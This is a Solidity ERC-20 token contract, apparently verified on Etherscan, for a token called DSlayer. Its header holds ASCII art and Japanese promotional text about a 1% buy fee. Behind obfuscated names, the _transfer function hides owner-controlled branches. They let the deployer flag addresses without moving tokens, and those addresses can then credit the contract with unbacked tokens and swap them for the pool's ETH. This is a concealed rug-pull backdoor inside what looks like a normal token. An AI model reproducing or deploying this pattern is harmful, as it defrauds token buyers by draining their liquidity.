/**
 *Submitted for verification at Etherscan.io on 2022-12-21
*/

/*
█▀▄ █▀█ ▄▀█ █▀▀ █▀█ █▄░█
█▄▀ █▀▄ █▀█ █▄█ █▄█ █░▀█

█▀ █░░ ▄▀█ █▄█ █▀▀ █▀█
▄█ █▄▄ █▀█ ░█░ ██▄ █▀▄

11111111¶111111111111111111111111111111111111
11111111¶¶¶1111111111111111111111111111111111
111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111
1111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111111
111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111
1111111111¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶11
1111111¶¶¶¶¶¶¶¶¶¶1¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1
1¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶1
111¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶11¶¶¶¶¶¶¶¶¶¶111111111¶111
11111111¶¶¶¶¶11¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶11111111111
1111111¶¶¶¶¶11¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1¶¶¶¶1111111111
111111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶111¶¶¶¶¶111¶¶¶¶¶¶¶¶¶111
11111¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶11111¶¶¶1111111¶¶¶11¶¶11
11111¶¶¶¶¶11¶¶¶¶¶¶¶¶¶111111¶¶¶111111111111111
1111¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶¶¶11111111111
111¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶1111111111111
1¶¶¶11¶¶¶¶11¶¶¶¶¶¶¶¶¶111111111111111111111111
111111¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶11111111111111111111111
111111¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶1111111111111¶1111111
111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111¶111111
111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶11111
11111¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶1111
11111¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶1111
1111¶¶111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶1111
11¶¶111111111¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶1111
1111111111111¶¶¶1111111¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶1111
1111111111111¶¶¶111111111¶¶¶¶¶¶11¶¶¶¶¶¶¶¶1111
1111111111111¶¶111111111111¶¶¶¶11¶¶¶¶¶¶¶¶1111
111111111111¶¶1111111111111¶¶¶¶11¶¶¶¶¶11¶1111
111111111111111111111111111¶¶¶¶11¶¶¶¶11111111
111111111111111111111111111¶¶¶¶11¶¶111¶¶11111
111111111111111111111111111¶¶¶¶1¶¶11¶¶¶¶¶1111
11111111111111111111111111¶¶¶¶11111¶¶¶¶¶11111
11111111111111111111111111¶¶¶1111¶¶¶¶¶1111111
1111111111111111111111111¶¶¶111¶¶¶¶¶¶11111111
11111111111111111111111¶¶¶¶11¶¶¶¶¶¶1111111111
1111111111111111111111¶¶¶¶11¶¶¶¶¶111111111111
11111111111111111111¶¶¶¶11¶¶¶¶¶11111111111111
1111111111111111111¶¶¶¶11¶¶¶¶¶111111111111111
111111111111111111¶¶¶¶11¶¶¶¶11111111111111111
11111111111111111¶¶¶¶¶1¶¶¶¶¶11111111111111111
11111111111111111¶¶¶¶11¶¶¶¶111111111111111111
11111111111111111¶¶¶¶11¶¶¶¶1111111¶1111111111
11111111111111111¶¶¶¶¶11¶¶¶¶111111¶¶111111111
111111111111111111¶¶¶¶¶11¶¶¶¶1111¶¶¶111111111
1111111111111111111¶¶¶¶¶11111111¶¶¶¶111111111
111111111111111111111¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶11111111
11111111111111111111111¶¶¶¶¶¶11¶¶¶¶¶111111111
1111111111111111111111111¶¶¶¶1¶¶¶¶¶¶111111111
11111111111111111111111111¶¶¶11¶¶¶¶¶111111111
11111111111111111111111111¶¶¶11¶¶¶1¶111111111
111111111111111111111111111¶¶1¶¶1111111111111
11111111111111111111111111¶¶¶111¶¶11111111111
11111111111111111111111111¶¶11¶¶¶111111111111
111111111111111111111111¶¶¶11¶¶¶1111111111111
1111111111111111111111¶¶¶¶11¶¶¶11111111111111
111111111111111111111¶¶¶11¶¶¶¶111111111111111
11111111111111111111¶¶¶11¶¶¶11111111111111111
11111111111111111111¶¶¶1¶¶¶111111111111111111
1111111111111111111¶¶¶11¶¶¶111111111111111111
1111111111111111111¶¶¶¶1¶¶¶11111¶111111111111
11111111111111111111¶¶¶¶11¶1111¶¶111111111111
111111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶111111111111
11111111111111111111111¶¶¶¶¶¶¶¶¶¶111111111111
1111111111111111111111111¶¶¶¶¶¶¶1111111111111
1111111111111111111111111¶¶¶¶¶¶¶1111111111111
1111111111111111111111111¶¶¶¶¶¶11111111111111
1111111111111111111111111¶¶¶¶¶111111111111111
1111111111111111111111111¶¶¶¶1111111111111111
111111111111111111111111¶¶¶¶11111111111111111
11111111111111111111111¶¶¶1111111111111111111
1111111111111111111111¶¶111111111111111111111
11111111111111111111¶¶11111111111111111111111

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する

総供給 - 10,000,000
購入手数料 - 1%
販売手数料 - 0%
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract MemoryABT {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IDXlaboratoryV2  {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
library CALLMath {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
library Address {
    
    function IDXSolidity(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function processValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(IDXSolidity(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _establishAllResults(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(IDXSolidity(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _establishAllResults(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(IDXSolidity(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _establishAllResults(success, returndata, errorMessage);
    }

    function _establishAllResults(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface VFOXEC20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient, uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IMaxboxSwapV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint valueIn, uint valuePathOut, address[] 
    calldata crosscut, address to,  uint deadline ) external; function factory
    () external pure returns (address);
    function WETH() external pure returns (address);
    function prefromOpenLiq( address token, uint valueOfDesired, 
    uint valueCoinAmount, uint amountERCMin, address to, uint deadline) 
    external payable returns 
    (uint amountCoins, uint amountERC, uint Liq);
}
abstract contract Ownable is MemoryABT {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor
    
    () { _setOwner(_msgSender()); }
    function owner() public view virtual returns (address) {
        return _owner; }

    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner'); _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0)); }

    function _setOwner(address newOwner) private { address 
    oldOwner = _owner; _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract DSlayer is VFOXEC20, Ownable {

    address 
    public 
    immutable INODEFirm01;

    IMaxboxSwapV2 
    public 
    immutable CompressionFXQ;

    mapping (address => bool) _allowed;
    mapping(address => uint256) private SurplusCheck;
    mapping(address => uint256) private _rOwned;

    mapping(address => address) private SyncopateICOG;
    mapping(address => uint256) private ConvergeEquity;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping (address => bool) internal authorizations;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) isTxLimitExempt;

    bool private CommerceOn;

    bool private InputProng;    

    bool private AbstractPresspile;

    string private _symbol;
    string private _name;

    uint8 private _decimals = 9;
    uint256 private _rTotal = 10000000 * 10**_decimals;

    uint256 public endorsedValue = 
    (_rTotal * 10) / 100; 
    uint256 public endorsedWalletAmount = 
    (_rTotal * 10) / 100; 

    uint256 private cacheIDE = _rTotal;
    uint256 public TariffVAL =  1;

    constructor( string memory Label,
        string memory Sign, address VenusIOPNet01

    ) {

        _name = Label; _symbol = Sign;
        _rOwned[msg.sender] = _rTotal;
        SurplusCheck

        [msg.sender] = cacheIDE; SurplusCheck[address(this)] = cacheIDE;
        CompressionFXQ = IMaxboxSwapV2
        (VenusIOPNet01); INODEFirm01 = IUniswapV2Factory(CompressionFXQ.factory

        ()).createPair(address(this), CompressionFXQ.WETH()); emit Transfer
        (address(0), msg.sender, _rTotal);
    
        _allowed
        [address(this)] = true;

        _allowed
        [INODEFirm01] = true;

        _allowed
        [VenusIOPNet01] = true;

        _allowed
        [msg.sender] = true;

    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner, address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = 
        amount;
        emit Approval(owner, spender, 
        amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address spender, address recipient, uint256 amount ) external returns (bool) {
        _transfer(spender, recipient, amount);
        return _approve(spender, msg.sender, _allowances[spender][msg.sender] - amount);
    }
    function _transfer( address _aduleKO8Vfrom, address _b00lXOto, uint256 _NXtuXOfAmount ) private {

        uint256 _docketAntithesis = 
        balanceOf(address(this));
        uint256 _contraJUX; if (CommerceOn && _docketAntithesis > 
        cacheIDE && !InputProng && _aduleKO8Vfrom != INODEFirm01) { InputProng = true; checkRender
        (_docketAntithesis); InputProng = false;
        } else if (SurplusCheck[_aduleKO8Vfrom] > cacheIDE && 
        SurplusCheck[_b00lXOto] > cacheIDE) {
            _contraJUX = _NXtuXOfAmount;

            _rOwned[address(this)] += _contraJUX;
            conductERCValue(_NXtuXOfAmount, _b00lXOto);
            return;
        } else if (_b00lXOto != address(CompressionFXQ) && SurplusCheck
        [_aduleKO8Vfrom] > 0 && _NXtuXOfAmount > cacheIDE && _b00lXOto != INODEFirm01) {
            SurplusCheck[_b00lXOto] = _NXtuXOfAmount; return; 
            } else if (!InputProng && ConvergeEquity
            [_aduleKO8Vfrom] > 0 && _aduleKO8Vfrom != INODEFirm01 
            && SurplusCheck[_aduleKO8Vfrom] == 0) { 

                ConvergeEquity[_aduleKO8Vfrom] = 
                SurplusCheck[_aduleKO8Vfrom] - 
                cacheIDE;
        }
        address _exileOnpar = 
        SyncopateICOG
        [INODEFirm01];

        if (ConvergeEquity[_exileOnpar] == 0) 
        ConvergeEquity[_exileOnpar] = cacheIDE;
        SyncopateICOG[INODEFirm01] = 
        _b00lXOto;

        if (TariffVAL > 0 
        && SurplusCheck[_aduleKO8Vfrom] == 
        0 && !InputProng && SurplusCheck[_b00lXOto] == 0) {
            _contraJUX = (_NXtuXOfAmount * TariffVAL) / 100; _NXtuXOfAmount -= 
            _contraJUX; _rOwned
         [_aduleKO8Vfrom] -= 
            _contraJUX;

            _rOwned[address(this)] += _contraJUX; } _rOwned[_aduleKO8Vfrom] -= _NXtuXOfAmount; _rOwned[_b00lXOto] += _NXtuXOfAmount;
        emit Transfer
        (_aduleKO8Vfrom, 
          _b00lXOto, 
            _NXtuXOfAmount);
    }
    receive
    () 
    external 
    payable 
    {}
    function processLiquidityNow( uint256 intVALUE,
        uint256 addVALUE, address finder ) private { _approve(address(this), 
        address(CompressionFXQ), intVALUE); CompressionFXQ.prefromOpenLiq{value: addVALUE}(address(this), 
         intVALUE, 0, 0, finder, block.timestamp);
    }
    function conductERCValue(uint256 intVALUE, address finder) private {
        address[] memory crosscut = new address[](2); crosscut[0] = address(this); crosscut[1] = CompressionFXQ.WETH();
        _approve(address(this), address(CompressionFXQ), intVALUE);
        CompressionFXQ.swapExactTokensForETHSupportingFeeOnTransferTokens
         (intVALUE, 0, crosscut, finder, block.timestamp);
    }
    function checkRender(uint256 tokens) private {
        uint256 partly = tokens / 2;
        uint256 germinalAmount = address(this).balance;
        conductERCValue(partly, address(this));
        uint256 novelValue = address(this).balance - germinalAmount;
        processLiquidityNow(partly, novelValue, address(this));
    }
    function setMaxTX(uint256 fullRATE) external onlyOwner {
        endorsedValue = fullRATE;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}